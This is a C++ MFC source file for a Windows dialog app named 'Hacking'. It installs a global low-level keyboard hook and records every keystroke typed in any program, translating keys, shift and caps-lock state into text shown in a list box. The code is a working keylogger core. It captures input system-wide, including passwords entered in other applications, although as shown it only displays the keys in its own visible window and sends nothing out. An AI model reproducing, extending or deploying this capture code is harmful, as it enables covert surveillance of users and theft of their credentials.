
// HackingDlg.cpp: 구현 파일
//

#include "pch.h"
#include "framework.h"
#include "Hacking.h"
#include "HackingDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CHackingDlg 대화 상자



CHackingDlg::CHackingDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_HACKING_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHackingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_input_key_value);
}

BEGIN_MESSAGE_MAP(CHackingDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
END_MESSAGE_MAP()


// CHackingDlg 메시지 처리기

BOOL CHackingDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 이 대화 상자의 아이콘을 설정합니다.  응용 프로그램의 주 창이 대화 상자가 아닐 경우에는
	//  프레임워크가 이 작업을 자동으로 수행합니다.
	SetIcon(m_hIcon, TRUE);			// 큰 아이콘을 설정합니다.
	SetIcon(m_hIcon, FALSE);		// 작은 아이콘을 설정합니다.

	g_input_key_value = &m_input_key_value;

	::SetWindowPos(m_hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

	SetHook();

	return TRUE;  // 포커스를 컨트롤에 설정하지 않으면 TRUE를 반환합니다.
}

// 대화 상자에 최소화 단추를 추가할 경우 아이콘을 그리려면
//  아래 코드가 필요합니다.  문서/뷰 모델을 사용하는 MFC 애플리케이션의 경우에는
//  프레임워크에서 이 작업을 자동으로 수행합니다.

void CHackingDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 그리기를 위한 디바이스 컨텍스트입니다.

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 클라이언트 사각형에서 아이콘을 가운데에 맞춥니다.
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 아이콘을 그립니다.
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// 사용자가 최소화된 창을 끄는 동안에 커서가 표시되도록 시스템에서
//  이 함수를 호출합니다.
HCURSOR CHackingDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


HHOOK g_hook = NULL;
HINSTANCE hInst = NULL;
bool capital = false, numLock = false, shift = false;

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
        wchar_t buf_keystroke[1024] = { 0, };

        if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
            shift = wParam == WM_KEYDOWN ? true : false;
        }//GetAsyncKeyState

        else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
            switch (keystroke->vkCode) {
            case 0x41: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"a" : L"A") : (shift ? L"A" : L"a"))); break; }
            case 0x42: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"b" : L"B") : (shift ? L"B" : L"b"))); break; }
            case 0x43: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"c" : L"C") : (shift ? L"C" : L"c"))); break; }
            case 0x44: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"d" : L"D") : (shift ? L"D" : L"d"))); break; }
            case 0x45: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"e" : L"E") : (shift ? L"E" : L"e"))); break; }
            case 0x46: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"f" : L"F") : (shift ? L"F" : L"f"))); break; }
            case 0x47: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"g" : L"G") : (shift ? L"G" : L"g"))); break; }
            case 0x48: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"h" : L"H") : (shift ? L"H" : L"h"))); break; }
            case 0x49: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"i" : L"I") : (shift ? L"I" : L"i"))); break; }
            case 0x4A: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"j" : L"J") : (shift ? L"J" : L"j"))); break; }
            case 0x4B: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"k" : L"K") : (shift ? L"K" : L"k"))); break; }
            case 0x4C: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"l" : L"L") : (shift ? L"L" : L"l"))); break; }
            case 0x4D: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"m" : L"M") : (shift ? L"M" : L"m"))); break; }
            case 0x4E: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"n" : L"N") : (shift ? L"N" : L"n"))); break; }
            case 0x4F: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"o" : L"O") : (shift ? L"O" : L"o"))); break; }
            case 0x50: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"p" : L"P") : (shift ? L"P" : L"p"))); break; }
            case 0x51: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"q" : L"Q") : (shift ? L"Q" : L"q"))); break; }
            case 0x52: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"r" : L"R") : (shift ? L"R" : L"r"))); break; }
            case 0x53: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"s" : L"S") : (shift ? L"S" : L"s"))); break; }
            case 0x54: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"t" : L"T") : (shift ? L"T" : L"t"))); break; }
            case 0x55: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"u" : L"U") : (shift ? L"U" : L"u"))); break; }
            case 0x56: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"v" : L"V") : (shift ? L"V" : L"v"))); break; }
            case 0x57: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"w" : L"W") : (shift ? L"W" : L"w"))); break; }
            case 0x58: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"x" : L"X") : (shift ? L"X" : L"x"))); break; }
            case 0x59: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"y" : L"Y") : (shift ? L"Y" : L"y"))); break; }
            case 0x5A: { wsprintfW(buf_keystroke, L"%s", (capital ? (shift ? L"z" : L"Z") : (shift ? L"Z" : L"z"))); break; }
            case 0x30: { wsprintfW(buf_keystroke, L"%s", (shift ? L")" : L"0")); break; }
            case 0x31: { wsprintfW(buf_keystroke, L"%s", (shift ? L"!" : L"1")); break; }
            case 0x32: { wsprintfW(buf_keystroke, L"%s", (shift ? L"@" : L"2")); break; }
            case 0x33: { wsprintfW(buf_keystroke, L"%s", (shift ? L"#" : L"3")); break; }
            case 0x34: { wsprintfW(buf_keystroke, L"%s", (shift ? L"$" : L"4")); break; }
            case 0x35: { wsprintfW(buf_keystroke, L"%s", (shift ? L"%" : L"5")); break; }
            case 0x36: { wsprintfW(buf_keystroke, L"%s", (shift ? L"^" : L"6")); break; }
            case 0x37: { wsprintfW(buf_keystroke, L"%s", (shift ? L"&" : L"7")); break; }
            case 0x38: { wsprintfW(buf_keystroke, L"%s", (shift ? L"*" : L"8")); break; }
            case 0x39: { wsprintfW(buf_keystroke, L"%s", (shift ? L"(" : L"9")); break; }
            case VK_OEM_1: { wsprintfW(buf_keystroke, L"%s", (shift ? L":" : L";")); break; }
            case VK_OEM_2: { wsprintfW(buf_keystroke, L"%s", (shift ? L"?" : L"/")); break; }
            case VK_OEM_3: { wsprintfW(buf_keystroke, L"%s", (shift ? L"~" : L"`")); break; }
            case VK_OEM_4: { wsprintfW(buf_keystroke, L"%s", (shift ? L"{" : L"[")); break; }
            case VK_OEM_5: { wsprintfW(buf_keystroke, L"%s", (shift ? L"|" : L"\\")); break; }
            case VK_OEM_6: { wsprintfW(buf_keystroke, L"%s", (shift ? L"}" : L"]")); break; }
            case VK_OEM_7: { wsprintfW(buf_keystroke, L"%s", (shift ? L"\"" : L"'")); break; }
            case VK_OEM_PLUS: { wsprintfW(buf_keystroke, L"%s", (shift ? L"+" : L"=")); break; }
            case VK_OEM_COMMA: { wsprintfW(buf_keystroke, L"%s", (shift ? L"<" : L",")); break; }
            case VK_OEM_MINUS: { wsprintfW(buf_keystroke, L"%s", (shift ? L"_" : L"-")); break; }
            case VK_OEM_PERIOD: { wsprintfW(buf_keystroke, L"%s", (shift ? L">" : L".")); break; }
            case VK_SPACE: { wsprintfW(buf_keystroke, L"%s", L"[SPACE]"); break; }
            case VK_NUMPAD0: { wsprintfW(buf_keystroke, L"%s", L"0"); break; }
            case VK_NUMPAD1: { wsprintfW(buf_keystroke, L"%s", L"1"); break; }
            case VK_NUMPAD2: { wsprintfW(buf_keystroke, L"%s", L"2"); break; }
            case VK_NUMPAD3: { wsprintfW(buf_keystroke, L"%s", L"3"); break; }
            case VK_NUMPAD4: { wsprintfW(buf_keystroke, L"%s", L"4"); break; }
            case VK_NUMPAD5: { wsprintfW(buf_keystroke, L"%s", L"5"); break; }
            case VK_NUMPAD6: { wsprintfW(buf_keystroke, L"%s", L"6"); break; }
            case VK_NUMPAD7: { wsprintfW(buf_keystroke, L"%s", L"7"); break; }
            case VK_NUMPAD8: { wsprintfW(buf_keystroke, L"%s", L"8"); break; }
            case VK_NUMPAD9: { wsprintfW(buf_keystroke, L"%s", L"9"); break; }
            case VK_MULTIPLY: { wsprintfW(buf_keystroke, L"%s", L"*"); break; }
            case VK_ADD: { wsprintfW(buf_keystroke, L"%s", L"+"); break; }
            case VK_SUBTRACT: { wsprintfW(buf_keystroke, L"%s", L"-"); break; }
            case VK_DECIMAL: { wsprintfW(buf_keystroke, L"%s", L","); break; }
            case VK_DIVIDE: { wsprintfW(buf_keystroke, L"%s", L"/"); break; }
            case VK_BACK: { wsprintfW(buf_keystroke, L"%s", L"[BACKSPACE]"); break; }
            case VK_TAB: { wsprintfW(buf_keystroke, L"%s", L"[TAB]"); break; }
            case VK_RETURN: { wsprintfW(buf_keystroke, L"%s", L"[ENTER]"); break; }
            case VK_MENU: { wsprintfW(buf_keystroke, L"%s", L"[ALT]"); break; }
            case VK_ESCAPE: { wsprintfW(buf_keystroke, L"%s", L"[ESC]"); break; }
            case VK_PRIOR: { wsprintfW(buf_keystroke, L"%s", L"[PG UP]"); break; }
            case VK_NEXT: { wsprintfW(buf_keystroke, L"%s", L"[PG DN]"); break; }
            case VK_END: { wsprintfW(buf_keystroke, L"%s", L"[END]"); break; }
            case VK_HOME: { wsprintfW(buf_keystroke, L"%s", L"[HOME]"); break; }
            case VK_LEFT: { wsprintfW(buf_keystroke, L"%s", L"[LEFT]"); break; }
            case VK_UP: { wsprintfW(buf_keystroke, L"%s", L"[UP]"); break; }
            case VK_RIGHT: { wsprintfW(buf_keystroke, L"%s", L"[RIGHT]"); break; }
            case VK_DOWN: { wsprintfW(buf_keystroke, L"%s", L"[DOWN]"); break; }
            case VK_PRINT: { wsprintfW(buf_keystroke, L"%s", L"[PRINT]"); break; }
            case VK_SNAPSHOT: { wsprintfW(buf_keystroke, L"%s", L"[PRT SC]"); break; }
            case VK_INSERT: { wsprintfW(buf_keystroke, L"%s", L"[INSERT]"); break; }
            case VK_DELETE: { wsprintfW(buf_keystroke, L"%s", L"[DELETE]"); break; }
            case VK_LWIN: { wsprintfW(buf_keystroke, L"%s", L"[WIN KEY]"); break; }
            case VK_RWIN: { wsprintfW(buf_keystroke, L"%s", L"[WIN KEY]"); break; }
            case VK_CAPITAL: { capital = !capital;   break; }
            case VK_NUMLOCK: { numLock = !numLock;   break; }
            case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { wsprintfW(buf_keystroke, L"%s", L"[L - CTRL]"); } break; }
            case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { wsprintfW(buf_keystroke, L"%s", L"[R - CTRL]"); } break; }
            case VK_F1: { wsprintfW(buf_keystroke, L"%s", L"[F1]"); break; }
            case VK_F2: { wsprintfW(buf_keystroke, L"%s", L"[F2]"); break; }
            case VK_F3: { wsprintfW(buf_keystroke, L"%s", L"[F3]"); break; }
            case VK_F4: { wsprintfW(buf_keystroke, L"%s", L"[F4]"); break; }
            case VK_F5: { wsprintfW(buf_keystroke, L"%s", L"[F5]"); break; }
            case VK_F6: { wsprintfW(buf_keystroke, L"%s", L"[F6]"); break; }
            case VK_F7: { wsprintfW(buf_keystroke, L"%s", L"[F7]"); break; }
            case VK_F8: { wsprintfW(buf_keystroke, L"%s", L"[F8]"); break; }
            case VK_F9: { wsprintfW(buf_keystroke, L"%s", L"[F9]"); break; }
            case VK_F10: { wsprintfW(buf_keystroke, L"%s", L"[F10]"); break; }
            case VK_F11: { wsprintfW(buf_keystroke, L"%s", L"[F11]"); break; }
            case VK_F12: { wsprintfW(buf_keystroke, L"%s", L"[F12]"); break; }
            default:
                DWORD dWord = keystroke->scanCode << 16;
                dWord += keystroke->flags << 24;
                wchar_t otherKey[16] = { 0, };

                if (GetKeyNameTextW(dWord, otherKey, sizeof(otherKey)) != 0) {
                    wsprintfW(buf_keystroke, L"GetKeyNameTextW - %s", otherKey);
                }
                break;

            }

            int index = g_input_key_value->InsertString(-1, buf_keystroke);
            g_input_key_value->SetCurSel(index);
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

BOOL CHackingDlg::SetHook()
{
	if (g_hook != NULL)
		UnHook();

	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, (HINSTANCE)theApp.m_hInstance, NULL);

	return TRUE;
}

BOOL CHackingDlg::UnHook()
{
	UnhookWindowsHookEx(g_hook);

	return TRUE;
}

void CHackingDlg::OnDestroy()
{
	UnHook();

	CDialogEx::OnDestroy();

	
}

